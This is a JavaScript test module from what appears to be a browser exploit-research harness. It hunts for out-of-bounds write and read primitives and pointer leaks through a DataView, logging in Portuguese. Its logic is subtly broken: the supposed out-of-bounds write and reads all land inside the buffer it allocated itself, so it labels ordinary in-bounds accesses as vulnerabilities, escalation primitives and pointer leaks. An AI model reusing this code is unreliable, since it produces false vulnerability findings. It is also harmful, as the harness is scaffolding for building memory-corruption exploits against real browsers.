// js/script1/testOOBReadInfoLeak.mjs
import { logS1, PAUSE_S1, toHexS1, isPotentialPointer64S1, isPotentialData32S1, SHORT_PAUSE_S1 } from './s1_utils.mjs';
import { getLeakedValueS1, setLeakedValueS1 } from '../state.mjs';

export async function testOOBReadInfoLeakEnhancedStoreS1() {
    const FNAME = 'testOOBReadInfoLeakEnhancedStoreS1'; 
    logS1("--- Iniciando Teste 2: OOB Write/Read (Leak) ---", 'test', FNAME); 
    const bufferSize = 32; 
    const writeValue = 0xEE; 
    const oobWriteOffset = bufferSize; 
    const readRangeStart = -64; 
    const readRangeEnd = bufferSize + 64; 
    const allocationSize = bufferSize + 256; 
    const baseOffsetInBuffer = 128; 
    const oobReadOffsets = []; 
    for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); } 
    let writeSuccess = false; 
    let potentialLeakFoundCount = 0; 
    setLeakedValueS1(null); // Reseta o estado global
    
    try { 
        const buffer = new ArrayBuffer(allocationSize); 
        const dataView = new DataView(buffer); 
        for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } 
        const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset; 
        await PAUSE_S1(); 
        
        try { 
            dataView.setUint8(writeTargetAddress, writeValue); 
            logS1(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHexS1(writeValue, 8)}`, 'vuln', FNAME); 
            logS1(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME); 
            writeSuccess = true; 
        } catch (e) { 
            logS1(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME); 
            logS1(`--- Teste 2 Concluído (Escrita OOB Falhou) ---`, 'test', FNAME); 
            return false; 
        } 
        
        await PAUSE_S1(); 
        
        for (const readOffset of oobReadOffsets) { 
            const readTargetAddress = baseOffsetInBuffer + readOffset; 
            const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`; 
            
            if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) { 
                try { 
                    const low = dataView.getUint32(readTargetAddress, true); 
                    const high = dataView.getUint32(readTargetAddress + 4, true); 
                    if (isPotentialPointer64S1(high, low)) { 
                        const vStr = `H=${toHexS1(high)} L=${toHexS1(low)}`; 
                        logS1(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); 
                        potentialLeakFoundCount++; 
                        if (getLeakedValueS1() === null) { 
                            setLeakedValueS1({ high, low, type: 'U64', offset: readOffset }); 
                            logS1(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); 
                            logS1(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME); 
                            logS1(` ---> INSIGHT: O valor vazado ${vStr} (tipo U64) em ${relOffsetStr} é um candidato a ponteiro...`, 'info', FNAME);
                        } 
                    } 
                } catch (e) {/* Out of bounds read is expected for some offsets */} 
            } 
            
            if (getLeakedValueS1() === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) { 
                try { 
                    const val32 = dataView.getUint32(readTargetAddress, true); 
                    if (isPotentialData32S1(val32)) { 
                        logS1(` -> Leak U32? ${relOffsetStr}: ${toHexS1(val32)}`, 'leak', FNAME); 
                        potentialLeakFoundCount++; 
                        setLeakedValueS1({ high: 0, low: val32, type: 'U32', offset: readOffset }); 
                        logS1(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); 
                        logS1(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME); 
                    } 
                    if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) { 
                        logS1(` -> Leu valor OOB escrito (${toHexS1(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME); 
                    } 
                } catch (e) {/* Out of bounds read */} 
            } 
            if (readOffset % 32 === 0) await PAUSE_S1(1); 
        } 
    } catch (e) { 
        logS1(`Erro fatal no Teste 2: ${e.message}`, 'error', FNAME); 
        console.error(e); 
    } finally { 
        const currentLeaked = getLeakedValueS1();
        const leakStatus = currentLeaked ? `1 valor ${currentLeaked.type} @${currentLeaked.offset}` : 'nenhum valor armazenado'; 
        logS1(`--- Teste 2 Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME); 
    } 
    return writeSuccess;
}
